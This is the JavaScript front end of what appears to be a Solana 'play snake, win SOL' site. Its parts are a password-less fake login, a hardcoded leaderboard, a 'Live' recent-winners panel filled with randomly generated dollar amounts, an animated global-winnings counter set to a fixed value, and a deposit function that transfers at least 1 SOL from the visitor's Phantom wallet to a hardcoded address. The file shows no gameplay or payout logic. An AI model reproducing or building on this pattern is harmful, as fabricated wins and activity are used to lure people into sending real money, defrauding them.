/* ============================================================
   GLOBAL APP STATE
============================================================ */

let userLoggedIn = false;
let currentUser = null;

const RECEIVER_ADDRESS = "HTUduW42xDZNiVf9NejQSCms9YqCDHgD1sdfeUEvtrHo";

/* ============================================================
   LOGIN MODAL LOGIC
============================================================ */

const loginModal = document.getElementById("loginModal");
const loginBtn = document.getElementById("loginBtn");
const closeModalBtn = document.querySelector(".close-modal");
const emailForm = document.getElementById("emailLoginForm");

loginModal.classList.add("hidden");

// OPEN modal
loginBtn.addEventListener("click", () => {
  if (userLoggedIn) {
    logoutUser();
    return;
  }
  loginModal.classList.remove("hidden");
});

// CLOSE modal
closeModalBtn.addEventListener("click", () => {
  loginModal.classList.add("hidden");
});

// CLICK OUTSIDE closes modal
window.addEventListener("click", (e) => {
  if (e.target === loginModal) {
    loginModal.classList.add("hidden");
  }
});

// EMAIL SUBMIT LOGIN
emailForm.addEventListener("submit", (e) => {
  e.preventDefault();

  const email = emailForm.querySelector("input").value.trim();
  if (!email) return;

  const username = email.split("@")[0];

  // simulate login delay
  setTimeout(() => {
    loginModal.classList.add("hidden");

    userLoggedIn = true;
    currentUser = username;

    document.querySelector(".welcome-highlight").textContent = username + "!";
    loginBtn.textContent = "Logout";

    document.getElementById("usernameInput").value = username;

  }, 500);
});

// LOGOUT FUNCTION
function logoutUser() {
  userLoggedIn = false;
  currentUser = null;

  document.querySelector(".welcome-highlight").textContent = "bruh!";
  document.getElementById("usernameInput").value = "";

  loginBtn.textContent = "Login";
}


/* ============================================================
   GENERIC MODAL GENERATOR
============================================================ */

function openModal(title, content) {
  const modal = document.createElement("div");
  modal.className = "modal";
  modal.style.zIndex = 99999;

  modal.innerHTML = `
    <div class="modal-content" style="max-width:520px; text-align:left;">
      <button class="close-modal">×</button>
      <h2 style="margin-bottom:12px;">${title}</h2>
      <div style="font-size:15px; line-height:1.5; color:#dbe8ff;">
        ${content}
      </div>
    </div>
  `;

  document.body.appendChild(modal);

  modal.querySelector(".close-modal").onclick = () => modal.remove();
}


/* ============================================================
   HOW TO PLAY MODAL
============================================================ */

document.getElementById("howToPlayBtn").onclick = () => {
  openModal("How to Play", `
    🐍 <b>Gameplay Rules</b><br><br>
    • Move your snake and avoid collisions.<br>
    • Snake grows as you survive longer.<br>
    • Longer survival = higher earnings.<br>
    • Stakes determine potential winnings.<br><br>
    <b>Simple:</b> Join → Survive → Win SOL.
  `);
};


/* ============================================================
   SMALL LEADERBOARD MODAL
============================================================ */

document.getElementById("leaderboardBtn").onclick = () => {
  openModal("Leaderboard (Top Players)", `
    1. Mr-1221z — $17,965<br>
    2. Quantum — $16,709<br>
    3. Denis237 — $11,493<br>
    4. SnakeLord — $9,221<br>
    5. SolDuke — $7,884<br>
    6. MetaDash — $6,945<br>
    7. SolStorm — $6,440<br>
    8. PixelSnake — $5,982<br>
    9. LightSol — $5,321<br>
    10. HexMaster — $4,992<br>
  `);
};


/* ============================================================
   FULL LEADERBOARD MODAL
============================================================ */

document.getElementById("fullLeaderboardBtn").onclick = () => {
  openModal("Full Leaderboard", `
    Same leaderboard data shown here.  
    (Later this will load from Firebase.)
  `);
};


/* ============================================================
   PHANTOM WALLET + SOL DEPOSIT
============================================================ */

async function connectWallet() {
  try {
    const provider = window.phantom?.solana;

    if (!provider) {
      alert("Phantom wallet not installed.");
      window.open("https://phantom.app/", "_blank");
      return null;
    }

    const resp = await provider.connect();
    return resp.publicKey.toString();

  } catch (err) {
    console.error("Wallet connection failed:", err);
    return null;
  }
}

async function depositSOL() {
  if (!userLoggedIn) {
    loginModal.classList.remove("hidden");
    return;
  }

  try {
    const provider = window.phantom?.solana;

    if (!provider) {
      alert("Phantom wallet required.");
      return;
    }

    let amount = parseFloat(document.getElementById("depositInput").value);

    if (isNaN(amount) || amount < 1) {
      alert("Minimum deposit is 1 SOL.");
      return;
    }

    const lamports = amount * 1_000_000_000;
    const publicKey = await connectWallet();

    if (!publicKey) {
      alert("Wallet connection failed.");
      return;
    }

    const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");

    const transaction = new solanaWeb3.Transaction().add(
      solanaWeb3.SystemProgram.transfer({
        fromPubkey: new solanaWeb3.PublicKey(publicKey),
        toPubkey: new solanaWeb3.PublicKey(RECEIVER_ADDRESS),
        lamports: lamports
      })
    );

    transaction.feePayer = new solanaWeb3.PublicKey(publicKey);
    const blockData = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockData.blockhash;

    const signedTx = await provider.signTransaction(transaction);
    const txSig = await connection.sendRawTransaction(signedTx.serialize());

    alert("Deposit Successful!\nTX: " + txSig);

  } catch (err) {
    console.error("Deposit error:", err);
    alert("Transaction failed.");
  }
}

document.getElementById("depositBtn").onclick = depositSOL;


/* ============================================================
   AUTO REFRESH WINNERS EVERY 30s
============================================================ */

function randomMoney(min, max) {
  return "$" + (Math.floor(Math.random() * (max - min)) + min).toLocaleString();
}

function refreshWinners() {
  const card = document.getElementById("winnersCard");

  card.innerHTML = `
    <div class="winners-header">
      <div class="winners-title">Recent Winners</div>
      <div class="winners-live">● Live</div>
    </div>
    <div class="winner-row"><span>BruhKing</span><span class="winner-amount">${randomMoney(900,1400)}</span></div>
    <div class="winner-row"><span>SnakeLord</span><span class="winner-amount">${randomMoney(700,1100)}</span></div>
    <div class="winner-row"><span>SolDuke</span><span class="winner-amount">${randomMoney(500,900)}</span></div>
  `;
}

setInterval(refreshWinners, 30000);


/* ============================================================
   ANIMATE COUNTERS ON LOAD
============================================================ */

function animateCounter(id, endValue, duration = 1500) {
  const el = document.getElementById(id);
  let start = 0;
  const stepTime = 10;
  const increment = endValue / (duration / stepTime);

  const timer = setInterval(() => {
    start += increment;

    if (start >= endValue) {
      start = endValue;
      clearInterval(timer);
    }

    el.textContent = Math.floor(start).toLocaleString();
  }, stepTime);
}

animateCounter("playersCount", 50);
animateCounter("globalWinnings", 832500);


/* ============================================================
   ENABLE JOIN GAME WHEN USERNAME ENTERED
============================================================ */

const joinGameBtn = document.getElementById("joinGameBtn");
const usernameInput = document.getElementById("usernameInput");

usernameInput.addEventListener("input", () => {
  if (usernameInput.value.trim().length > 0) {
    joinGameBtn.classList.remove("disabled");
  } else {
    joinGameBtn.classList.add("disabled");
  }
});
